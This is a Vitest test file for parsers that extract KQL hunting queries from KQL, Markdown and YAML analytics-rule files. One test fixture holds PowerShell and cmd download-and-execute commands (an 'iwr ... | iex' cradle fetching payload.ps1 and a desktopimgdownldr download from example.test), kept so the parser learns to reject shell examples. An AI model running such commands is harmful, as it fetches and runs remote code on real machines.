import { describe, expect, it } from "vitest";

import {
	candidateFileKind,
	findKqlStructuralProblem,
	parseCandidateFile,
	parseMarkdownKql,
	parseStandaloneKql,
	parseYamlAnalyticsRules,
} from "../../src/lib/ingest/parsers";

describe("candidate file selection", () => {
	it("accepts only explicit KQL, Markdown, and YAML source shapes", () => {
		expect(candidateFileKind("queries/login.kql")).toBe("standalone-kql");
		expect(candidateFileKind("queries/login.kusto")).toBe("standalone-kql");
		expect(candidateFileKind("docs/hunting.MD")).toBe("markdown");
		expect(candidateFileKind("rules/login.yml")).toBe("yaml");
		expect(candidateFileKind("queries/login.txt")).toBeNull();
		expect(candidateFileKind("rules/login.json")).toBeNull();
	});
});

describe("standalone KQL parser", () => {
	it("normalizes line endings and derives a title without changing query text", () => {
		expect(
			parseStandaloneKql(
				"Defender/failed_sign-ins.kql",
				"\uFEFFSigninLogs   \r\n| where ResultType != 0\r\n",
			),
		).toEqual([
			expect.objectContaining({
				title: "failed sign ins",
				kql: "SigninLogs\n| where ResultType != 0",
				blockIndex: 0,
				kind: "standalone-kql",
			}),
		]);
	});

	it("requires a balanced terminal result expression", () => {
		for (const invalid of [
			"let OUPattern = @'example';",
			"let schedule_start_hour = ;\nprint schedule_start_hour",
			"let value = 1;\n| project value",
			"set query_datetimescope_from = ago(1h);\n...",
			"externaldata(Value:string))[h'https://example.test/data']",
			"// let Function = (value:string) {\nprint value",
		]) {
			expect(findKqlStructuralProblem(invalid), invalid).not.toBeNull();
		}
		for (const valid of [
			"let value = 1;\nprint value",
			"let tableName = 'SigninLogs';\ntable(tableName) | take 1",
			"DeviceEvents | take 10;",
			"_SentinelAudit() | take 10",
		]) {
			expect(findKqlStructuralProblem(valid), valid).toBeNull();
		}
	});

	it("moves a standalone use-case wrapper into metadata", () => {
		expect(
			parseStandaloneKql(
				"WindowsEvent/Show Application Hangs.kql",
				`Intune Device Query - kql

Use Case: Monitoring application hang events in Windows systems over the past 7 days.

Query:

WindowsEvent('Application', 7d)
| where tostring(EventId) == '1002'`,
			),
		).toEqual([
			expect.objectContaining({
				title: "Show Application Hangs",
				description:
					"Monitoring application hang events in Windows systems over the past 7 days.",
				kql:
					"WindowsEvent('Application', 7d)\n| where tostring(EventId) == '1002'",
			}),
		]);
	});

	it("rejects JSON saved with a KQL extension", () => {
		expect(
			parseStandaloneKql(
				"workbooks/example.kql",
				'{"version":"Notebook/1.0","items":[]}',
			),
		).toEqual([]);
	});

	it("recovers a fenced query from a Markdown document saved as KQL", () => {
		expect(
			parseCandidateFile(
				"docs/example.kql",
				"# Suspicious sign-ins\n\n```kql\nSigninLogs\n| where ResultType != 0\n```",
			),
		).toEqual([
			expect.objectContaining({
				title: "Suspicious sign-ins",
				kql: "SigninLogs\n| where ResultType != 0",
				kind: "markdown-fence",
			}),
		]);
	});
});

describe("Markdown fenced KQL parser", () => {
	it("extracts labeled KQL fences and ignores other languages", () => {
		const blocks = parseMarkdownKql(
			"docs/login.md",
			`---
title: Authentication hunting
author: Ada Analyst
description: Finds failed authentication.
---
# Failed sign-ins

Use this during sign-in triage.

\`\`\`kql
SigninLogs
| where ResultType != 0
\`\`\`

\`\`\`sql
select * from users
\`\`\`

## Risk correlation

~~~Kusto
AADUserRiskEvents
| take 20
~~~
`,
		);

		expect(blocks).toHaveLength(2);
		expect(blocks[0]).toMatchObject({
			title: "Failed sign-ins",
			author: "Ada Analyst",
			description: "Finds failed authentication.",
			blockIndex: 0,
		});
		expect(blocks[1]).toMatchObject({
			title: "Risk correlation",
			kql: "AADUserRiskEvents\n| take 20",
			blockIndex: 2,
		});
	});

	it("uses physical candidate-fence ordinals without counting other languages", () => {
		const blocks = parseMarkdownKql(
			"Defender/MDE-DefenderSmartScreenEvents.md",
			`# Defender SmartScreen

\`\`\`json
{"documentation":true}
\`\`\`

\`\`\`kql
This prose-only example is not executable.
\`\`\`

\`\`\`powershell
Get-Process
\`\`\`

\`\`\`kql
DeviceEvents
| where ActionType == "SmartScreenUrlWarning"
\`\`\`
`,
		);

		expect(blocks).toEqual([
			expect.objectContaining({
				kql:
					'DeviceEvents\n| where ActionType == "SmartScreenUrlWarning"',
				blockIndex: 1,
			}),
		]);
	});

	it("suffixes only repeated headings instead of unrelated later headings", () => {
		const blocks = parseMarkdownKql(
			"docs/multiple.md",
			`## IP

\`\`\`kql
DeviceNetworkEvents | take 1
\`\`\`

## Subnet

\`\`\`kql
DeviceNetworkEvents | take 2
\`\`\`

## IP

\`\`\`kql
DeviceNetworkEvents | take 3
\`\`\`
`,
		);

		expect(blocks.map((block) => block.title)).toEqual([
			"IP",
			"Subnet",
			"IP 2",
		]);
	});

	it("does not ingest an unlabeled code fence", () => {
		expect(
			parseMarkdownKql(
				"docs/example.md",
				"```\nSigninLogs | take 10\n```",
			),
		).toEqual([]);
	});

	it("accepts an unlabeled KQL-shaped fence under a query heading", () => {
		expect(
			parseMarkdownKql(
				"docs/example.md",
				"# Example\n\n## Microsoft Sentinel Query\n\n```\nSigninLogs | take 10\n```",
			),
		).toEqual([
			expect.objectContaining({
				title: "Microsoft Sentinel Query",
				kql: "SigninLogs | take 10",
			}),
		]);
	});

	it("recovers heuristic and unterminated fences only for reviewed paths", () => {
		const mislabeled =
			"# Detection\n\n```sql\nDeviceEvents\n| where ActionType == 'x'\n```";
		expect(parseMarkdownKql("docs/example.md", mislabeled)).toEqual([]);
		expect(
			parseMarkdownKql("docs/example.md", mislabeled, {
				allowHeuristicFences: true,
			}),
		).toEqual([
			expect.objectContaining({
				kql: "DeviceEvents\n| where ActionType == 'x'",
			}),
		]);

		expect(
			parseMarkdownKql(
				"docs/unterminated.md",
				"## Defender XDR\n\n```kql\nDeviceInfo\n| take 10",
			),
		).toEqual([
			expect.objectContaining({ kql: "DeviceInfo\n| take 10" }),
		]);
	});

	it("rejects Windows shell examples in unlabeled fences without losing later KQL", () => {
		const blocks = parseMarkdownKql(
			"DFIR/MDE - URLLookup.md",
			`# URL Lookup

## Description

\`\`\`
powershell -exec bypass -c "iwr('http://example.test/payload.ps1')|iex"

set "SYSTEMROOT=C:\\Windows\\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://example.test/file.ext

cmd.exe /c echo regsvr32.exe /s
\`\`\`

## Defender XDR

\`\`\`
DeviceNetworkEvents
| where RemoteUrl contains "example.test"
\`\`\`

## Sentinel

\`\`\`
DeviceProcessEvents
| where ProcessCommandLine contains "example.test"
\`\`\`
`,
			{ allowHeuristicFences: true },
		);

		expect(blocks).toHaveLength(2);
		expect(blocks.map((block) => block.title)).toEqual([
			"Defender XDR",
			"Sentinel",
		]);
		expect(blocks.map((block) => block.blockIndex)).toEqual([1, 2]);
	});

	it("rejects a KQL fragment with an uncommented prose suffix", () => {
		for (const body of [
			"let BetweenTwoStrings = @'.*/(.*)HTTP'; Between the last '/' and 'HTTP'.",
			"let Regex = @'\\\\(.*?)\\\\'; Between \\ extra \\ to escape and until \\.",
		]) {
			expect(
				parseMarkdownKql(
					"KQL Regex/RegexExamples.md",
					`## Regex example

\`\`\`kql
${body}
\`\`\`
`,
				),
			).toEqual([]);
		}
	});

	it("treats a repeated language marker as a malformed closing fence", () => {
		expect(
			parseMarkdownKql(
				"docs/repeated-marker.md",
				"## Microsoft Sentinel\n\n```kql\nSigninLogs\n| take 10\n```kql",
			),
		).toEqual([
			expect.objectContaining({ kql: "SigninLogs\n| take 10" }),
		]);
	});

	it("closes a KQL fence with another recognized KQL language alias", () => {
		expect(
			parseMarkdownKql(
				"docs/example.md",
				"## Defender XDR\n\n```kql\nDeviceEvents\n| take 10\n```Kusto",
			),
		).toEqual([
			expect.objectContaining({
				kql: "DeviceEvents\n| take 10",
			}),
		]);
	});

	it("moves a prose sentence out of a labeled KQL fence", () => {
		expect(
			parseMarkdownKql(
				"Defender/SmartScreen.md",
				`# Defender SmartScreen

\`\`\`kql
A user overrode a SmartScreen warning and opened an untrusted app.
DeviceEvents
| where ActionType == "SmartScreenUserOverride"
\`\`\`
`,
			),
		).toEqual([
			expect.objectContaining({
				description:
					"A user overrode a SmartScreen warning and opened an untrusted app.",
				kql:
					'DeviceEvents\n| where ActionType == "SmartScreenUserOverride"',
			}),
		]);
	});

	it("keeps the document description and records block dialect headings", () => {
		const blocks = parseMarkdownKql(
			"Identity/GroupMembershipReport.md",
			`# Group Membership Report

## Description

Reports group membership for active identities.

## Defender XDR

\`\`\`kql
IdentityInfo
| take 10
\`\`\`

## Microsoft Sentinel

\`\`\`kql
IdentityInfo
| take 10
\`\`\`
`,
		);

		expect(blocks).toEqual([
			expect.objectContaining({
				description: "Reports group membership for active identities.",
				dialectHint: "defender-xdr",
			}),
			expect.objectContaining({
				description: "Reports group membership for active identities.",
				dialectHint: "sentinel",
			}),
		]);
	});

	it("accepts comments between a table and the first pipe operator", () => {
		expect(
			parseMarkdownKql(
				"Azure Active Directory/device-code.md",
				`# Device code sign-in

## Query Information

### MITRE ATT&CK Techniques

| ID | Name |
| --- | --- |
| T1566.002 | Spearphishing Link |

### Description

Lists successful device-code sign-ins from unmanaged devices.

### References

- https://example.test/reference

## Defender XDR

\`\`\`kql
AADSignInEventsBeta
// Keep only successful sign-ins.
| where ErrorCode == 0
\`\`\`
`,
			),
		).toEqual([
			expect.objectContaining({
				title: "Defender XDR",
				description:
					"Lists successful device-code sign-ins from unmanaged devices.",
				kql:
					"AADSignInEventsBeta\n// Keep only successful sign-ins.\n| where ErrorCode == 0",
			}),
		]);
	});
});

describe("YAML analytics rule parser", () => {
	it("extracts literal query fields and rule metadata", () => {
		const blocks = parseYamlAnalyticsRules(
			"rules/failed-signins.yaml",
			`id: 6a5d01af
name: Failed sign-in burst
description: >
  Detects repeated
  sign-in failures.
severity: Medium
author: Ada Analyst
queryFrequency: 1h
query: |-
  SigninLogs
  | where ResultType != 0
  | summarize Attempts=count() by UserPrincipalName
`,
		);

		expect(blocks).toEqual([
			expect.objectContaining({
				title: "Failed sign-in burst",
				description: "Detects repeated sign-in failures.",
				author: "Ada Analyst",
				kql:
					"SigninLogs\n| where ResultType != 0\n| summarize Attempts=count() by UserPrincipalName",
				kind: "yaml-rule",
			}),
		]);
	});

	it("supports multiple YAML documents with quoted or folded query fields", () => {
		const blocks = parseYamlAnalyticsRules(
			"rules/multiple.yml",
			`---
id: one
name: One
severity: Low
query: "SigninLogs | take 1"
---
id: two
name: Two
severity: High
query: >
  AuditLogs
  | take 2
`,
		);

		expect(blocks.map((block) => block.kql)).toEqual([
			"SigninLogs | take 1",
			"AuditLogs | take 2",
		]);
	});

	it("ignores generic YAML with a query key but no analytics-rule marker", () => {
		expect(
			parseYamlAnalyticsRules(
				"config.yml",
				"query: |\n  SigninLogs | take 10\noutput: stdout",
			),
		).toEqual([]);
	});
});
